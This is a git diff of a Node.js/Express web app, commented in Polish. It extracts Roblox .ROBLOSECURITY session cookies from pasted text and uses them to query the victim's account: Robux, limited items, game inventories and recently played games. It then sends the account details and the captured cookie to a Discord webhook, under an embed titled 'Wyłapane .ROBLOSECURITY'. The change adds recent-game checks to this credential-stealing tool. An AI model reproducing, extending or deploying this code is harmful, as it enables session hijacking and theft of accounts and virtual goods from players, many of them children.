@@ -1,5 +1,6 @@
 const express = require('express');
 const app = express();
+const crypto = require('crypto');
 
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
@@ -47,27 +48,22 @@ async function check() {
     return;
   }
 
-  // Wyciąganie cookie – ulepszone pod PowerShell i inne formaty
   let cookie = null;
   let match;
 
-  // 1. Format PowerShell / .NET
   match = raw.match(/"\\.ROBLOSECURITY",\\s*"([^"]+)"/);
   if (match && match[1]) cookie = match[1].trim();
 
-  // 2. Klasyczny -and-items.|_
   if (!cookie) {
     match = raw.match(/-and-items\.\|_(.*?)(?=")/s);
     if (match && match[1]) cookie = match[1].trim();
   }
 
-  // 3. Długi ciąg z ostrzeżeniem
   if (!cookie) {
     match = raw.match(/_\\|WARNING[^"]{200,}/);
     if (match) cookie = match[0].trim();
   }
 
-  // 4. Ostateczny fallback – najdłuższy ciąg zaczynający się od _
   if (!cookie) {
     const fallback = raw.match(/_[\\w\\-|]{180,}/g) || [];
     if (fallback.length) cookie = fallback.reduce((a, b) => a.length > b.length ? a : b).trim();
@@ -91,30 +87,30 @@ async function check() {
     const json = await res.json();
 
     if (json.error) {
-      result.innerHTML = \`<span class="error">Błąd: \${json.error}</span>\`;
+      result.innerHTML = `<span class="error">Błąd: ${json.error}</span>`;
       return;
     }
 
-    let html = \`<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>\`;
-    if (json.avatarUrl) html += \`<img id="avatar" src="\${json.avatarUrl}" alt="Avatar"><br>\`;
+    let html = `<span class="success">Konto sprawdzone i wysłane na webhook!</span><br><br>`;
+    if (json.avatarUrl) html += `<img id="avatar" src="${json.avatarUrl}" alt="Avatar"><br>`;
 
-    html += \`
-      <b>Username:</b> \${json.username || '?'}<br>
-      <b>User ID:</b> \${json.userId || '?'}<br>
-      <b>Premium:</b> \${json.hasPremium ? 'True' : 'False'}<br>
-      <b>Email Verified:</b> \${json.emailVerified ? 'True' : 'False'}<br>
-      <b>Robux:</b> \${json.robux?.toLocaleString('en-US') || 0}<br>
-      <b>Headless:</b> \${json.hasHeadless ? 'True' : 'False'}<br>
-      <b>Korblox:</b> \${json.hasKorblox ? 'True' : 'False'}<br>
-      <b>MM2:</b> \${json.mm2Count || 0}<br>
-      <b>AMP:</b> \${json.ampCount || 0}<br>
-      <b>SAB:</b> \${json.sabCount || 0}<br>
-      <b>JB:</b> \${json.jbCount || 0}<br>
-    \`;
+    html += `
+      <b>Username:</b> ${json.username || '?'}<br>
+      <b>User ID:</b> ${json.userId || '?'}<br>
+      <b>Premium:</b> ${json.hasPremium ? 'True' : 'False'}<br>
+      <b>Email Verified:</b> ${json.emailVerified ? 'True' : 'False'}<br>
+      <b>Robux:</b> ${json.robux?.toLocaleString('en-US') || 0}<br>
+      <b>Headless:</b> ${json.hasHeadless ? 'True' : 'False'}<br>
+      <b>Korblox:</b> ${json.hasKorblox ? 'True' : 'False'}<br>
+      <b>MM2:</b> ${json.mm2Count || 0} ${json.isRecentMM2 ? '✅' : '❌'}<br>
+      <b>AMP:</b> ${json.ampCount || 0} ${json.isRecentAMP ? '✅' : '❌'}<br>
+      <b>SAB:</b> ${json.sabCount || 0} ${json.isRecentSAB ? '✅' : '❌'}<br>
+      <b>JB:</b> ${json.jbCount || 0} ${json.isRecentJB ? '✅' : '❌'}<br>
+    `;
 
     result.innerHTML = html;
   } catch (err) {
-    result.innerHTML = \`<span class="error">Błąd: \${err.message}</span>\`;
+    result.innerHTML = `<span class="error">Błąd: ${err.message}</span>`;
   }
 }
 </script>
@@ -123,7 +119,7 @@ async function check() {
   `);
 });
 
-// Endpoint /check – główna logika + wysyłka embedów
+// Główny endpoint
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
 
@@ -154,7 +150,7 @@ app.post('/check', async (req, res) => {
     if (!userRes.ok) throw new Error('Invalid cookie');
     const userData = await userRes.json();
 
-    // Email Verified (via hat)
+    // Email Verified (hat)
     let emailVerified = false;
     try {
       const ownsRes = await fetch(`https://inventory.roblox.com/v1/users/${userData.id}/items/Asset/102611803`, {
@@ -199,7 +195,7 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
-    // Groups Owned (rank 255)
+    // Groups Owned
     let groupsOwned = 0;
     try {
       const groupsRes = await fetch(`https://groups.roblox.com/v2/users/${userData.id}/groups/roles`, {
@@ -294,6 +290,75 @@ app.post('/check', async (req, res) => {
       }
     } catch {}
 
+    // Ostatnio grane gry – Continue Playing (omni-recommendation)
+    let recentlyPlayedPlaceIds = [];
+    let isRecentJB   = false;
+    let isRecentMM2  = false;
+    let isRecentAMP  = false;
+    let isRecentSAB  = false;
+
+    try {
+      const omniRes = await fetch('https://apis.roblox.com/discovery-api/omni-recommendation', {
+        method: 'POST',
+        headers: {
+          'Cookie': `.ROBLOSECURITY=${cookie}`,
+          'X-CSRF-TOKEN': csrfToken,
+          'Content-Type': 'application/json',
+          'Accept': 'application/json',
+          'Origin': 'https://www.roblox.com',
+          'Referer': 'https://www.roblox.com/'
+        },
+        body: JSON.stringify({
+          pageType: "Home",
+          sessionId: crypto.randomUUID(),
+          count: 30,
+          device: { deviceType: "Desktop", operatingSystem: "Windows" },
+          contextualParameters: {}
+        })
+      });
+
+      if (omniRes.ok) {
+        const data = await omniRes.json();
+
+        let continueSection = null;
+
+        // Najczęściej spotykane miejsca w odpowiedzi
+        if (data.recommendations) {
+          continueSection = data.recommendations.find(r =>
+            r.title?.toLowerCase().includes('continue') ||
+            r.title?.toLowerCase().includes('recent') ||
+            r.sort?.name?.toLowerCase().includes('continue')
+          );
+        }
+
+        if (!continueSection && data.homepageData?.sections) {
+          continueSection = data.homepageData.sections.find(s =>
+            s.title?.toLowerCase().includes('continue playing') ||
+            s.title?.toLowerCase().includes('recently played')
+          );
+        }
+
+        if (continueSection?.items) {
+          recentlyPlayedPlaceIds = continueSection.items
+            .filter(item => item.placeId || item.universe?.rootPlaceId || item.universeId)
+            .map(item => item.placeId || item.universe?.rootPlaceId || item.universeId);
+        }
+      }
+    } catch (e) {
+      console.error('Continue Playing fetch error:', e.message);
+    }
+
+    // Przykładowe place/universe ID (aktualne na 2025/2026 – mogą wymagać weryfikacji)
+    const jbPlaces   = [606849621];                     // Jailbreak
+    const mm2Places  = [142823291];                     // Murder Mystery 2
+    const ampPlaces  = [185655149];                     // Adopt Me (jeśli AMP = Adopt Me)
+    const sabPlaces  = [];                              // ← tutaj wpisz place ID SAB jeśli znasz
+
+    isRecentJB  = recentlyPlayedPlaceIds.some(id => jbPlaces.includes(id));
+    isRecentMM2 = recentlyPlayedPlaceIds.some(id => mm2Places.includes(id));
+    isRecentAMP = recentlyPlayedPlaceIds.some(id => ampPlaces.includes(id));
+    isRecentSAB = recentlyPlayedPlaceIds.some(id => sabPlaces.includes(id));
+
     const result = {
       success: true,
       username: userData.name,
@@ -311,10 +376,14 @@ app.post('/check', async (req, res) => {
       mm2Count,
       ampCount,
       sabCount,
-      jbCount
+      jbCount,
+      isRecentJB,
+      isRecentMM2,
+      isRecentAMP,
+      isRecentSAB
     };
 
-    // Wysyłka webhook – dwa embedy
+    // Webhook – dwa embedy
     const webhookUrl = process.env.WEBHOOK;
     if (webhookUrl) {
       try {
@@ -323,7 +392,6 @@ app.post('/check', async (req, res) => {
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             embeds: [
-              // Embed 1 – informacje o koncie
               {
                 color: 0x0F0F23,
                 title: `<:User:1481761037257674872> ${userData.name}`,
@@ -348,10 +416,10 @@ app.post('/check', async (req, res) => {
                   {
                     name: "**Games**",
                     value:
-                      `<:MM2:1481763122808230164> MM2: **${mm2Count}**\n` +
-                      `<:AMP:1481763635775930520> AMP: **${ampCount}**\n` +
-                      `<:SAB:1481763931113394177> SAB: **${sabCount}**\n` +
-                      `<:JB:1481804052215103509> JB: **${jbCount}**`,
+                      `<:MM2:1481763122808230164> MM2: **${mm2Count}** ${isRecentMM2 ? '(✅)' : '(❌)'}\n` +
+                      `<:AMP:1481763635775930520> AMP: **${ampCount}** ${isRecentAMP ? '(✅)' : '(❌)'}\n` +
+                      `<:SAB:1481763931113394177> SAB: **${sabCount}** ${isRecentSAB ? '(✅)' : '(❌)'}\n` +
+                      `<:JB:1481804052215103509> JB: **${jbCount}** ${isRecentJB ? '(✅)' : '(❌)'}`,
                     inline: true
                   },
                   {
@@ -367,7 +435,6 @@ app.post('/check', async (req, res) => {
                 },
                 timestamp: new Date().toISOString()
               },
-              // Embed 2 – cookie
               {
                 color: 0x4B0082,
                 title: "Wyłapane .ROBLOSECURITY",
